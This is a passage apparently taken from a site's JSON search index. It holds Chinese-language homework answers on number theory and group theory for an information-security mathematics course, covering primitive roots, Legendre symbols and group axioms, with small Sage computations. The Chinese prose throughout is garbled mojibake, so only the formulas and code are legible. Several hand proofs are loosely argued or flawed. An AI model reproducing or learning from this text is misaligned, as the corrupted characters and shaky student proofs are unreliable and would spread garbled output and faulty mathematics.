\\not\\equiv 1 \\pmod{47}$$ï¼Œå› æ­¤æˆ‘ä»¬å¾—åˆ°äº† 47 çš„ä¸€ä¸ªåŸæ ¹ 5ï¼Œå› æ­¤æ ¹æ®ä»¥ä¸‹çš„ç¨‹åºå¯ä»¥è®¡ç®—å‡ºæ‰€æœ‰çš„åŸæ ¹ï¼š\n#!/usr/bin/env python2 from sage.all import *  class PrimitiveRoot:  def __init__(self, integer):  self.R = IntegerModRing(integer)  self.phi = euler_phi(self.R.order())  self.root = self.R(primitive_root(self.R.order()))   def get_roots(self):  self.roots = []  for i in range(euler_phi(self.phi)):  if gcd(i, self.phi) == 1:  self.roots.append(self.root ** i)  return sorted(self.roots)  def solve():  PR = PrimitiveRoot(47)  print(PR.get_roots())  # [5, 10, 11, 13, 15, 23, 31, 38, 40, 41, 43] åŒæ ·æˆ‘ä»¬å¯ä»¥å¾—åˆ°ï¼š59 çš„æ‰€æœ‰åŸæ ¹ï¼š\n[2, 8, 10, 11, 14, 23, 32, 33, 40, 42, 44, 47, 50, 56]\n5 #  #!/usr/bin/env sage print(primitive_root(113)) # 3 6 #  æŒ‡æ•°è¡¨ï¼š\n#!/usr/bin/env sage N = 19 R = IntegerModRing(N) R(primitive_root(N)).powers(euler_phi(N)) # [1, 2, 4, 8, 16, 13, 7, 14, 9, 18, 17, 15, 11, 3, 6, 12, 5, 10] å¯¹äº $$8 x^4 \\equiv 3 \\pmod{19}$$\n#!/usr/bin/env sage solve_mod([8 * x**4 == 3], 19) # [(5,), (14,)] å¦å¤–ä¹Ÿå¯ä»¥ï¼Œè®¡ç®— 8 çš„æ¨¡ 19 é€†å…ƒ 12ï¼Œæœ‰ç­‰å¼ $$x^4 \\equiv 17 \\pmod{19}$$ï¼Œå–ç¦»æ•£å¯¹æ•° $$ind_2 x^4 \\equiv ind_2 17 \\pmod{18} \\Rightarrow 2ind_2 x \\equiv 5 \\pmod{9}$$ï¼Œæ˜¾ç„¶æˆ‘ä»¬å¾—åˆ° $$\\pm 5$$\nå¯¹äº $$5 x^3 \\equiv 2 \\pmod{19}$$\n#!/usr/bin/env sage solve_mod([5 * x **3 == 2], 19) # [(2,), (3,), (14,)] å¦å¤–ï¼Œè®¡ç®— 5 å…³äºæ¨¡ 19 çš„é€†å…ƒ 4ï¼Œæœ‰ç­‰å¼ $$x^3 \\equiv 8 \\pmod{19} \\Rightarrow 3 ind_2 x \\equiv ind_2 8 \\pmod{18} \\Rightarrow ind_2 x \\equiv 1 \\pmod{6}$$ï¼Œå¾—åˆ°ä¸‰ä¸ªè§£ 2,3,14\nå¯¹äº $$x^7 \\equiv 1 \\pmod{19}$$\n#!/usr/bin/env sage solve_mod([x ** 7 == 1], 19) # [(1,)] $$x^7 \\equiv 1 \\pmod{19} \\Rightarrow 7 ind_2 x \\equiv \\phi(19) \\pmod{\\phi(19)} \\Rightarrow x = 1 \\pmod{19}$$\n7 #  #!/usr/bin/env sage solve_mod([x**22 == 5], 41) # [(6,), (35,)] è¯æ˜é¢˜ #  1 #  ä»¤ $$x = ord_m a, y = ord_m b$$ï¼Œæ˜¾ç„¶æˆ‘ä»¬æœ‰ $$a^x \\equiv b^y \\equiv 1 \\pmod{m}$$\nä¸æ˜¯ä¸€èˆ¬æ€§æˆ‘ä»¬è®¾ $$x \\ge y$$ï¼Œé‚£ä¹ˆ $$a^x b^y \\equiv a^{x-y} (ab)^y \\equiv 1 \\pmod{m}$$\næ ¹æ® $$ab \\equiv 1 \\pmod{m}$$ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ° $$a^{x-y} \\equiv 1 \\pmod{m}$$\nå¾ˆæ˜¾ç„¶è‹¥ x-y æ˜¯ä¸€ä¸ªæ¯” x æ›´å°ä¸”ä¸ä¸º 1 çš„æ­£æ•´æ•°ï¼Œè¿™ä¸ x ä¸º a çš„æ¬¡æ•°æ¡ä»¶ç›¸æ‚–ã€‚\nåªæœ‰å¯èƒ½ x=yï¼Œäº¦å³ $$ord_m a = ord_m b$$\n2 #  å¯¹äº $$a^s$$ï¼Œæˆ‘ä»¬æœ‰ $$(a^{s})^t = a^{st} \\equiv 1 \\pmod{m}$$\nç„¶åæˆ‘ä»¬è¯æ˜ t çš„æœ€å°æ€§ï¼Œæˆ‘ä»¬çŸ¥é“ $$\\forall k \u0026lt; t$$ è‹¥æ»¡è¶³ $$(a^s)^k \\equiv 1\\pmod{m}$$ï¼Œå¿…æœ‰å­˜åœ¨è¿™æ ·çš„ $$ks \u0026lt; st$$ï¼Œ$$a^{ks} \\equiv 1 \\pmod{m}$$ï¼Œè¿™ä¸ st æ˜¯æ¬¡æ•°ç›¸æ‚–ã€‚æ‰€ä»¥ t æ˜¯æœ€å°çš„ã€‚\nå³ t å°±æ˜¯ $$a^s$$ çš„æ¬¡æ•°ã€‚\n3 #  $$g^k$$ æ˜¯ m çš„åŸæ ¹$$\\Leftrightarrow (g^k)^{\\phi(m)} \\equiv 1 \\pmod{m}$$ ä¸” $$(g^k)^{t} \\not\\equiv 1 \\pmod{m}, t \u0026lt; \\phi(m)$$\nå¯¹äº $$\\forall t \u0026lt; \\phi(m)$$ï¼Œè‹¥ $$g^t \\equiv 1 \\pmod{m}$$ï¼Œé‚£ä¹ˆå¿…ç„¶æœ‰ $$g^{kt} \\equiv 1 \\pmod{m}$$ï¼Œè¿™ä¸ä¹‹å‰çš„è®ºè¯æ˜¯çŸ›ç›¾çš„ï¼Œå› æ­¤å¿…ç„¶æœ‰ g ä¹Ÿæ˜¯ä¸€ä¸ªåŸæ ¹ã€‚\n4 #  ä»¤ $$x = ord_m a, y = ord_m b$$ï¼Œæ˜¾ç„¶æˆ‘ä»¬æœ‰ $$a^x \\equiv b^y \\equiv 1 \\pmod{m}$$\né‚£ä¹ˆ $$a^{xy} \\equiv b^{xy} \\equiv 1 \\pmod{m} \\Rightarrow (ab)^{xy} \\equiv 1 \\pmod{m}$$\nä¸‹é¢è¯æ˜ xy çš„æœ€å°æ€§ï¼š\nè®¾ $$\\exist m \u0026lt; xy, (ab)^m \\equiv 1 \\pmod{m}$$ï¼Œé‚£ä¹ˆå¿…æœ‰ $$m | xy$$ã€‚\nå› ä¸º $$gcd(x, y) = 1$$ï¼Œé‚£ä¹ˆ m å¿…ç„¶æ˜¯ xã€y çš„å› å­æˆ–å…¶æœ¬èº«ï¼›\nå› ä¸º xã€y åˆ†åˆ«æ˜¯ aã€b çš„æ¬¡æ•°ï¼Œæ‰€ä»¥ä¸€å®šä¸å­˜åœ¨ä¸€ä¸ªå› å­æ»¡è¶³å¹‚ä½™ä¸€çš„æ€§è´¨ï¼›\nåˆå› ä¸º $$gcd(x, y) = 1$$ï¼Œxã€y çš„å› å­å¿…ç„¶å½¼æ­¤äº’ç´ ï¼›\nå› æ­¤ä¸å­˜åœ¨è¿™æ ·çš„ mï¼Œæ‰€ä»¥ xy çš„æœ€å°æ€§å¾—è¯ã€‚\n5 #  æ ¹æ®ä¸‹é¢çš„å®šç†ï¼š\n è®¾ m æ˜¯å¤§äº 1 çš„æ•´æ•°ï¼Œåˆ™ m çš„åŸæ ¹å­˜åœ¨çš„å……è¦æ¡ä»¶æ˜¯ m ä¸º $$2, 4, p^l, 2p^l$$ ä¹‹ä¸€ï¼Œå…¶ä¸­ $$l \\ge 1,$$ p æ˜¯å¥‡ç´ æ•°ã€‚\n å¯¹ 12 è¿›è¡Œç´ å› å­åˆ†è§£ $$12 = 2^2 * 3$$ï¼Œå¾ˆæ˜¾ç„¶å¹¶ä¸å­˜åœ¨åŸæ ¹ã€‚\n6 #  è®¾ $$k = ord_{F_n}(2)$$ï¼Œå³è¯æ˜ $$k \\le 2^{n+1}$$\nå› ä¸ºæˆ‘ä»¬å‘ç° $$2^{2^{n+1}} = 2^{2^{n} * 2} \\equiv 1^2 \\equiv 1 \\pmod{2^{2^{n}} + 1}$$\nå› æ­¤ k ä¸€å®šæ˜¯ $$2^{n+1}$$ æˆ–è€…å…¶å› å­ï¼Œå³ä¸€å®šæœ‰ $$k \\le 2^{n+1}$$\n7 #  ï¼ˆ1ï¼‰\né¦–å…ˆæˆ‘ä»¬æœ‰ $$2^{2^{n+1}} = 2^{2^{n} * 2} \\equiv 1^2 \\equiv 1 \\pmod{2^{2^{n}} + 1}$$\nå› ä¸º $$p | 2^{2^{n}} + 1$$ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…ç„¶æœ‰ $$2^{2^{n+1}} \\equiv 1 \\pmod{p}$$\nç„¶åæˆ‘ä»¬è¯æ˜å…¶æœ€å°æ€§ï¼Œå› ä¸ºæˆ‘ä»¬æœ‰ä¸Šé¢çš„ç­‰å¼ $$ord_p (2)$$ ä¸€å®šæ˜¯ $$2^{n+1}$$ æˆ–å…¶å› å­ï¼Œè€Œåè€…çš„å› å­ä»…æœ‰ $$2^t, t \\le n+1 $$\n$$(2^{2^t})^{2^{n-t}} \\equiv 2^{2^{n}} \\equiv -1 \\pmod{2^{2^n} + 1} \\Rightarrow (2^{2^t})^{2^{n-t}} \\equiv -1 \\pmod{p} $$\nè€Œå¦‚æœ $$2^t$$ æ˜¯ä¸€ä¸ªåŸæ ¹çš„è¯ï¼Œé‚£ä¹ˆå¿…ç„¶ä¼šæœ‰ $$2^{2^t} \\equiv 1 \\pmod{p} \\Rightarrow (2^{2^t})^{2^{n-t}} \\equiv 1 \\pmod{p} $$\nä»¥ä¸Šä¸¤ç‚¹æ˜¯çŸ›ç›¾çš„ï¼Œå› æ­¤ $$2^t$$ ä¸å¯èƒ½æ˜¯ä¸€ä¸ªåŸæ ¹ã€‚\nï¼ˆ2ï¼‰\np å½¢å¦‚ $$2^{n+1} k + 1 \\Leftrightarrow p \\equiv 1 \\pmod{2^{n+1}}$$\nå› ä¸º p æ˜¯å¥‡ç´ æ•°ï¼Œæˆ‘ä»¬åˆæœ‰ $$2^{p-1} \\equiv 1 \\pmod{p}$$\nè€Œåˆæ ¹æ®ç¬¬ä¸€é—®æˆ‘ä»¬æœ‰ $$ord_p (2) = 2^{n+1}$$ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…ç„¶æœ‰ $$2^{n+1} | (p-1)$$\nå³å¿…ç„¶æœ‰ $$p-1 \\equiv 0 \\pmod{2^{n+1}} \\Rightarrow p \\equiv 1\\pmod{2^{n+1}}$$\n8 #  p ä»¥ g ä¸ºåŸæ ¹ $$\\Rightarrow g^{\\phi(p)} \\equiv 1 \\pmod{p}$$ ä¸” $$g^{t} \\not\\equiv 1 \\pmod{p}, t \u0026lt; \\phi(p)$$\nè€Œå› ä¸º p æ˜¯å¥‡ç´ æ•°ï¼Œæ‰€ä»¥å¾ˆæ˜¾ç„¶æˆ‘ä»¬æœ‰ $$\\phi(p) = p -1$$\næ‰€ä»¥æˆ‘ä»¬çŸ¥é“ $$g^{\\frac{p-1}{2}} \\equiv 1^{\\frac{1}{2}} \\pmod{p}$$\nè€Œå¯¹äº p-1ï¼Œæ°å¥½æ»¡è¶³ $$(p-1)^2 = p^2 -2p + 1 \\equiv 1 \\pmod{p}$$\næ‰€ä»¥ $$\\displaystyle g^{\\frac{p-1}{2}} \\equiv p - 1 \\pmod{p} \\Rightarrow ind_g (p-1) = \\frac{p-1}{2}$$\n"},{"id":238,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/3.2/","title":"3.2","section":"HOMEWORK","content":"3.2 #  è§£ç­”é¢˜ #  1 #  ç›´æ¥é€šè¿‡ sage è®¡ç®—ï¼š\n#!/usr/bin/env sage print(kronecker(2, 29)) # -1 å¦å¤–ï¼Œå¯ä»¥å…·ä½“è¿‡ç¨‹ä¸ºï¼š\nå¯¹äºå‹’è®©å¾·ç¬¦å· $$\\displaystyle (\\frac{a}{p}) = (\\frac{2}{29})$$ï¼Œæ ¹æ®æ¬§æ‹‰åˆ¤åˆ«æ¡ä»¶ $$\\displaystyle (\\frac{2}{29}) = 2^{\\frac{28}{2}} \\equiv 32^2 * 16 \\equiv 9 * 16 \\equiv 144 \\equiv -1 \\pmod{29}$$\næˆ–è€… $$p \\equiv -3 \\pmod{8}$$ï¼Œå› æ­¤ $$\\displaystyle (\\frac{2}{29}) = -1$$\næ‰€ä»¥ 2 ä¸ä¸º 29 çš„äºŒæ¬¡å‰©ä½™ã€‚\n2 #  -1 æ˜¯æ¨¡ p çš„äºŒæ¬¡å‰©ä½™ $$\\displaystyle \\Leftrightarrow (\\frac{-1}{p}) = 1â€‹$$\nå¯¹äºå·¦ä¾§å‹’è®©å¾·ç¬¦å· $$\\displaystyle (\\frac{-1}{p}) = (-1)^{\\frac{p-1}{2}} = \\begin{cases} 1 \u0026amp; \\text{è‹¥ } p \\equiv 1 \\pmod{4} \\ -1 \u0026amp; \\text{è‹¥ } p \\equiv 3\\pmod{4}\\end{cases}$$\næ‰€ä»¥ -1 æ˜¯æ¨¡ p çš„äºŒæ¬¡å‰©ä½™çš„ä¸€ä¸ªå……è¦æ¡ä»¶æ˜¯ $$p \\equiv 1 \\pmod{4}$$\n3 #  #!/usr/bin/env sage print(kronecker(191, 397)) # 1 è¿™è¯´æ˜ 191 å¯¹ 397 çš„å‹’è®©å¾·ç¬¦å·ä¸º 1ï¼Œè¯´æ˜ 191 æ˜¯ 397 çš„äºŒæ¬¡å‰©ä½™ã€‚å³æ–¹ç¨‹æœ‰è§£ã€‚\n#!/usr/bin/env sage solve_mod(x**2 == 191, 397) # [(117,), (280,)] å¦å¤–ï¼Œæ‰‹ç®—å¯ä»¥ä½¿ç”¨äºŒæ¬¡äº’åå¾‹ï¼š\né¦–å…ˆï¼š\n#!/usr/bin/env sage is_prime(191), is_prime(397) # True, True $$\\displaystyle (\\frac{191}{397})(\\frac{397}{191}) = (-1)^{95 * 198} = 1 \\Leftrightarrow (\\frac{191}{397}) = 1*(\\frac{15}{191})â€‹$$\nå¯¹äº 15 å¯¹æ¨¡ 191 çš„å‹’è®©å¾·ç¬¦å·ï¼š$$\\displaystyle (\\frac{15}{191}) = (\\frac{3}{191})(\\frac{5}{191}) = (-1)^{195}(\\frac{191}{3})(-1)^{295}(\\frac{191}{5}) = -1*(\\frac{2}{3})* 1 *(\\frac{1}{5})$$\nè€Œæˆ‘ä»¬æœ‰ $$\\displaystyle (\\frac{2}{3}) = 2^{\\frac{3-1}{2}} = -1, (\\frac{1}{5}) = 1$$\nå› è€Œå¯¹äºåŸå¼ï¼š$$\\displaystyle (\\frac{191}{397}) = 1*(-1)1(-1)*1 = 1â€‹$$\n4 #  #!/usr/bin/env sage print(kronecker(11, 511)) # -1 è¿™è¯´æ˜ 11 å¯¹ 511 çš„é›…å¯æ¯”ç¬¦å·ä¸º -1ï¼Œè¯´æ˜ 11 æ˜¯ 511 çš„äºŒæ¬¡éå‰©ä½™ã€‚å³æ–¹ç¨‹æ— è§£ã€‚\nå¦å¤–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨äºŒæ¬¡äº’åå¾‹ï¼š\né¦–å…ˆï¼š\n#!/usr/bin/env sage factor(511) # 7 * 73 $$\\displaystyle (\\frac{11}{511}) = (\\frac{11}{7})(\\frac{11}{73})$$\nå¯¹äºå‰è€… $$\\displaystyle (\\frac{3}{7}) =3^{\\frac{7 - 1}{2}} \\equiv 3^3 \\equiv -1 \\pmod{7}$$\nå¯¹äºåè€… $$\\displaystyle (\\frac{11}{73}) = (-1)^{\\frac{11 - 1}{2} \\frac{73-1}{2}} (\\frac{73}{11}) = (\\frac{-2}{11}) = (-2)^{5} = -32 \\equiv 1 \\pmod{11}â€‹$$\næ‰€ä»¥ç»¼ä¸Šï¼Œ$$\\displaystyle (\\frac{11}{511}) = -1$$ï¼Œå› æ­¤ 11 æ˜¯ 511 çš„äºŒæ¬¡éå‰©ä½™ã€‚æ–¹ç¨‹æ— è§£ã€‚\n5 #  #!/usr/bin/env sage print(kronecker(2, 73)) # 1 è¿™è¯´æ˜ 2 å¯¹ 73 çš„å‹’è®©å¾·ç¬¦å·ä¸º 1ï¼Œè¯´æ˜ 2 æ˜¯ 73 çš„äºŒæ¬¡å‰©ä½™ã€‚å³æ–¹ç¨‹æœ‰è§£ã€‚\n#!/usr/bin/env sage solve_mod(x**2 == 2, 73) # [(32,), (41,)] å¦å¤–ï¼Œå¯¹äºç¬”ç®—æ–¹æ³•ã€‚é¦–å…ˆï¼š\n#!/usr/bin/env sage print(is_prime(73)) # True print(73 % 8) # 1 $$\\displaystyle 73 \\equiv 1 \\pmod{8} \\Rightarrow (\\frac{2}{73}) = 1$$\n6 #  å³æ–¹ç¨‹ $$n^2 \\equiv 3 \\pmod{313}$$ æ˜¯å¦æœ‰è§£ï¼Œè¿™ç­‰ä»·äºæ±‚ 3 æ˜¯å¦ä¸ºæ¨¡ 313 çš„äºŒæ¬¡å‰©ä½™ã€‚\n#!/usr/bin/env sage kronecker(3, 313) # 1 è¿™è¡¨ç¤º 3 ç¡®å®ä¸º 313 çš„äºŒæ¬¡å‰©ä½™ã€‚\nå¦å¤–ä¹Ÿå¯ä»¥ï¼š$$\\displaystyle (\\frac{3}{313}) = (-1)^{1*156} (\\frac{313}{3}) = (\\frac{1}{3}) = 1$$\n7 #  ï¼ˆ1ï¼‰$$\\displaystyle (\\frac{17}{37}) = (-1)^{818}(\\frac{3}{17}) =(-1)^{18} \\frac{2}{3} = -1$$\nï¼ˆ2ï¼‰$$\\displaystyle (\\frac{151}{373}) = (-1)^{75186}(\\frac{71}{151}) = (-1)^{3575} (\\frac{9}{71}) = -(\\frac{3^2}{71}) = -1â€‹$$\nï¼ˆ3ï¼‰$$\\displaystyle (\\frac{191}{397}) = (-1)^{95198} (\\frac{15}{191}) = (\\frac{3}{191})(\\frac{5}{191}) = (-1)^{195}(\\frac{2}{3})(-1)^{2*95}(\\frac{1}{5}) = 1$$\nï¼ˆ4ï¼‰$$\\displaystyle (\\frac{911}{2003}) = (-1)^{4551001} (\\frac{181}{911}) = -(-1)^{90455}(\\frac{6}{181}) = -(\\frac{2}{181})(-1)^{1*90}(\\frac{1}{3})$$\næ³¨æ„åˆ° $$181 \\equiv -3 \\pmod{8}$$ï¼Œå› æ­¤ $$\\displaystyle (\\frac{911}{2003}) = 1$$\nï¼ˆ5ï¼‰é¦–å…ˆï¼š\n#!/usr/bin/env sage is_prime(37), is_prime(20040803) # (True, True) $$\\displaystyle (\\frac{37}{20040803}) = (-1)^{18k} (\\frac{12}{37}) = (\\frac{3}{37})(\\frac{2^2}{37}) = (-1)^{118} (\\frac{1}{3}) = 1$$\n8 #  è®¾ x ä»¥ 5 ä¸ºäºŒæ¬¡å‰©ä½™ï¼Œäº¦å³ $$\\displaystyle (\\frac{5}{x}) = 1$$\n$$\\displaystyle (\\frac{5}{x}) = (-1)^{2*k} (\\frac{x}{5}) = (\\frac{x}{5})$$\nç©·ä¸¾ 0 åˆ° 4 å³å¯ä»¥å¾—åˆ°è§£ï¼š$$x \\in {k \\equiv 1, 2, 4 \\pmod{5}, k \\in \\mathbb{Z}}â€‹$$\n9 #  #!/usr/bin/env sage x, y = var(\u0026#39;x\u0026#39;), var(\u0026#39;y\u0026#39;) len(solve_mod([x**3 - 3*x + 10 == y**2], 23)) # 17 ä¸ä¼šä¸è§£æ–¹ç¨‹çš„åšæ³•ã€‚\n10 #  ï¼ˆ1ï¼‰$$\\displaystyle (\\frac{51}{71}) = (\\frac{3}{71}) (\\frac{17}{71}) = (-1)^{135} (\\frac{2}{3}) * (-1)^{835} (\\frac{3}{17}) = (-1)^{1*8} (\\frac{2}{3}) = -1$$\nï¼ˆ2ï¼‰$$\\displaystyle (\\frac{35}{97}) = (\\frac{5}{97})(\\frac{7}{97}) = (-1)^{248} (\\frac{2}{5})(-1)^{3*48}(\\frac{6}{7}) = (-1) * (-1) = 1$$\nï¼ˆ3ï¼‰$$\\displaystyle (\\frac{313}{401}) = (-1)^{156 * 200} (\\frac{88}{313}) = (\\frac{11}{313}) (\\frac{2}{313}) (\\frac{2^2}{313}) = (-1)^{5*156} (\\frac{5}{11}) = (\\frac{1}{5}) = 1$$\nï¼ˆ4ï¼‰$$\\displaystyle (\\frac{165}{503}) = (\\frac{3}{503}) (\\frac{5}{503}) (\\frac{11}{503}) = (-1)^{1251} (\\frac{2}{3}) * (-1)^{2251}(\\frac{3}{5}) * (-1)^{3*251} (\\frac{8}{11})$$\n$$\\displaystyle = 1 * (-1) * (-1) (\\frac{2^2}{11})(\\frac{2}{11}) = -1$$\nè¯æ˜é¢˜ #  1 #  å……åˆ†æ€§ï¼š\nè‹¥ $$x^2 \\equiv 3 \\pmod{p}â€‹$$ æœ‰è§£ï¼Œå³ 3 ä¸ºæ¨¡ p çš„äºŒæ¬¡å‰©ä½™ï¼Œå³ $$\\displaystyle (\\frac{3}{p}) = 1â€‹$$\n$$\\displaystyle (\\frac{3}{p}) = 1 \\Leftrightarrow (-1)^{1 * \\frac{p - 1}{2}} (\\frac{p}{3}) = 1 \\Leftrightarrow$$\n$$\\displaystyle \\big(p \\equiv 1 \\pmod{4} ä¸” p \\equiv 1 \\pmod{3}\\big) æˆ– \\big(p \\equiv 3 \\pmod{4} ä¸” p \\equiv 2 \\pmod{3}\\big)$$\nåº”ç”¨ä¸­å›½å‰©ä½™å®šç†ï¼š$$\\Leftrightarrow p \\equiv 1 \\pmod{12} æˆ– p \\equiv 11 \\pmod{12}$$\n$$\\Leftrightarrow p \\equiv \\pm 1 \\pmod{12}$$\nå¿…è¦æ€§ï¼š\nå› ä¸ºåœ¨è¿›è¡Œå……åˆ†æ€§æ¨å¯¼æ—¶çš„æ¯ä¸€æ­¥éƒ½æ˜¯ç­‰ä»·çš„ï¼Œå› æ­¤ä¹Ÿæ˜¯å¿…è¦æ¡ä»¶ã€‚\n2 #  5 æ˜¯æ¨¡ p çš„äºŒæ¬¡å‰©ä½™ $$\\displaystyle \\Leftrightarrow (\\frac{5}{p}) = 1 \\Leftrightarrow (\\frac{p}{5}) = 1 \\Leftrightarrow \\exist x, x^2 \\equiv p \\pmod{5}â€‹$$\nå› ä¸ºæˆ‘ä»¬æœ‰ $$p \\equiv 1 \\pmod{5}$$ï¼Œæ˜¾ç„¶å­˜åœ¨ x=1ï¼Œä½¿å¾—ä¸Šå¼æˆç«‹ï¼Œå› æ­¤å¾—è¯ã€‚\n3 #  è€ƒè™‘åˆ†è§£å‹’è®©å¾·ç¬¦å·ï¼š\n$$\\displaystyle (\\frac{b}{p}) + (\\frac{2b}{p}) + \\cdots + (\\frac{(p-1)b}{p}) = (\\frac{b}{p}) \\sum_{i = 1}^{p - 1} (\\frac{i}{p})$$\nå¯¹äºåé¢çš„åŠ å’Œï¼Œå› ä¸º\n è®¾ p æ˜¯å¥‡ç´ æ•°ï¼Œåˆ™æ¨¡ p çš„ç¼©ç³»ä¸­äºŒæ¬¡å‰©ä½™ä¸éäºŒæ¬¡å‰©ä½™çš„ä¸ªæ•°å„ä¸º $$\\displaystyle \\frac{p - 1}{2}$$ï¼Œä¸” $$\\displaystyle \\frac{p - 1}{2}$$ ä¸ªäºŒæ¬¡å‰©ä½™åˆ†åˆ«ä¸åºåˆ— $$\\displaystyle 1^2, 2^2, \\cdots, (\\frac{p - 1}{2})^2$$ ä¸­çš„ä¸€ä¸ªæ•°åŒä½™ï¼Œä¸”ä»…ä¸ä¸€ä¸ªæ•°åŒä½™ã€‚\n æ‰€ä»¥ $$\\displaystyle \\sum_{i = 1}^{p-1} (\\frac{i}{p}) = 0$$ï¼Œæ‰€ä»¥åˆå¼ä¸º 0ã€‚\n4 #  $$\\displaystyle (\\frac{-3}{p}) = (\\frac{-1}{p})(\\frac{3}{p}) = (-1)^{\\frac{p - 1}{2}}(-1)^{1*\\frac{p-1}{2}} (\\frac{p}{3}) = \\frac{p}{3} =\\begin{cases} 1 \u0026amp; p \\equiv 1 \\pmod{3} \\ -1 \u0026amp; p \\equiv 2 \\pmod{3}\\end{cases}$$\nè€ƒè™‘åˆ° p æ˜¯å¥‡æ•°ï¼Œå³ $$p \\equiv 1 \\pmod{2}$$\næ‰€ä»¥æ ¹æ®ä¸­å›½å‰©ä½™å®šç†ï¼š$$\\displaystyle (\\frac{-3}{p}) = \\begin{cases} 1 \u0026amp; p \\equiv 1 \\pmod{6} \\ -1 \u0026amp; p \\equiv -1 \\pmod{6}\\end{cases}$$\n5 #  æˆ‘ä»¬çŸ¥é“ä»¥ä¸‹çš„ç»“è®ºï¼š\n æˆ‘ä»¬çŸ¥é“ 1,4 å¿…ç„¶æ˜¯ p çš„äºŒæ¬¡å‰©ä½™ï¼› å…¶æ¬¡æˆ‘ä»¬çŸ¥é“ $$\\displaystyle (\\frac{6}{p}) = (\\frac{2}{p})(\\frac{3}{p})$$ï¼Œåˆ™ 6,2,3 ä¸‰ä¸ªæ•°ä¸­å¿…ç„¶æœ‰ä¸€ä¸ªæ˜¯äºŒæ¬¡å‰©ä½™ï¼›  åˆ™ä»¥ä¸‹ä¸‰å¯¹å¿…ç„¶æœ‰ä¸€ä¸ªå‡ä¸ºäºŒæ¬¡å‰©ä½™ï¼š\n 1 ä¸ 3ï¼Œ2 ä¸ 4ï¼Œ4 ä¸ 6  "},{"id":239,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/4.1/","title":"4.1","section":"HOMEWORK","content":"4.1 ç¾¤ #  è¯æ˜é¢˜ #  1 #  ï¼ˆ1ï¼‰\nè¿™ä¸ªè¿ç®—æ˜¯äº¤æ¢çš„ï¼š\n $$n * m = -m - n = -n -m = n*m$$  ä½†æ˜¯è¿™ä¸ªè¿ç®—ä¸æ˜¯ç»“åˆçš„\n $$(a * b) * c = -(a*b) -c = a + b - c$$ $$a * (b * c) = -a - (b * c) = -a + b + c$$  ï¼ˆ2ï¼‰\nè¿™ä¸ªè¿ç®—åœ¨æ•´æ•°é›†ä¸Šæ˜¯å°é—­çš„ï¼š\n $$\\forall a, b \\in \\mathbb{Z}, a * b = a + b -2 \\in \\mathbb{Z}$$  è¿™ä¸ªè¿ç®—æ˜¯ç»“åˆçš„ï¼š\n $$\\forall a, b, c \\in \\mathbb{Z}, (a * b) * c = (a + b - 2) + c - 2 = a + (b + c - 2) -2 = a*(b*c)$$  è¿™ä¸ªä»£æ•°ç³»ç»Ÿä¸­å­˜åœ¨å¹ºå…ƒï¼š\n $$\\exist e = 2 \\in \\mathbb{Z}, \\forall a \\in \\mathbb{Z}, 2 * a = a * 2 = a + 2 - 2 = a$$  è¿™ä¸ªæ•´æ•°é›†ä¸­çš„æ¯ä¸ªå…ƒç´ åœ¨è¿™ä¸ªä»£æ•°ç³»ç»Ÿä¸­éƒ½å­˜åœ¨é€†å…ƒï¼š\n $$\\forall a \\in \\mathbb{Z}, \\exist (4 - a) \\in \\mathbb{Z}, a * (4 - a) = a + 4 -a - 2 = 2 = e$$  æ‰€ä»¥è¿™ä¸ªä»£æ•°ç³»ç»Ÿæ˜¯ä¸€ä¸ªç¾¤ã€‚\n2 #  è¿™ä¸ªè¿ç®—åœ¨ G å†…æ˜¯å°é—­çš„ï¼›\nè¿™ä¸ªè¿ç®—åœ¨ G ä¸Šæ»¡è¶³ç»“åˆå¾‹ï¼›\nè¿™ä¸ªä»£æ•°ç³»ç»Ÿä¸­å­˜åœ¨å¹ºå…ƒï¼š\n ä»»æ„å…ƒç´ éƒ½å­˜åœ¨å¹ºå…ƒï¼š  $$\\forall a, a_i, a_j \\in G$$ï¼Œæœ‰æ¶ˆå»ç‡ï¼š$$a\\cdot a_i = a \\cdot a_j \\Leftrightarrow a_i = a_j$$ï¼Œå› ä¸º G æ˜¯æœ‰é™ç¾¤ï¼Œè®¾ $$G = {a_0, a_1, \\cdots, a_{n-1}}$$ åˆ™ $${a\\cdot a_0, a \\cdot a_1, \\cdots, a \\cdot a_{n-1}}$$ ä¸¤ä¸¤ä¸ç›¸åŒä¸”å› ä¸ºè¿ç®—å°é—­å‡åœ¨ G ä¸­ï¼Œè€Œåˆä¸ G çš„åŠ¿ç›¸åŒï¼Œå› æ­¤æ€»æœ‰ $${a\\cdot a_0, a \\cdot a_1, \\cdots, a \\cdot a_{n-1}} = G = {a_0, a_1, \\cdots, a_{n-1}}$$ã€‚ æ‰€ä»¥æ€»å­˜åœ¨è¿™æ ·çš„ tï¼Œ$$a \\cdot a_t = a$$ï¼Œå³ $$a_t$$ ä¸ºè¿™ä¸ªä»£æ•°ç³»ç»Ÿçš„å¹ºå…ƒã€‚   $$e = a_t$$ ä¸º G ä¸­æ‰€æœ‰å…ƒç´ çš„å¹ºå…ƒï¼š  å¯¹äº $$e = a_t$$ï¼Œè‹¥ $$\\exist a_i \\in G, e \\cdot a_i \\not= a_i$$ï¼Œ é‚£ä¹ˆæ ¹æ®å‰é¢çš„è®¨è®ºæ€»æœ‰ $$\\exist a_j \\in G, a_i = a \\cdot a_j \\Rightarrow e \\cdot a \\cdot a_j \\not= a \\cdot a_j$$ï¼Œè¿™å¾ˆæ˜¾ç„¶æ˜¯çŸ›ç›¾çš„ æ‰€ä»¥ $$\\forall a_i \\in G, e \\cdot a_i = a_i$$    è¿™ä¸ªé›†åˆ G ä¸­çš„æ¯ä¸ªå…ƒç´ åœ¨è¿™ä¸ªä»£æ•°ç³»ç»Ÿä¸­éƒ½å­˜åœ¨é€†å…ƒï¼š\n åŒæ ·çš„ï¼Œæˆ‘ä»¬æœ‰ $${a\\cdot a_0, a \\cdot a_1, \\cdots, a 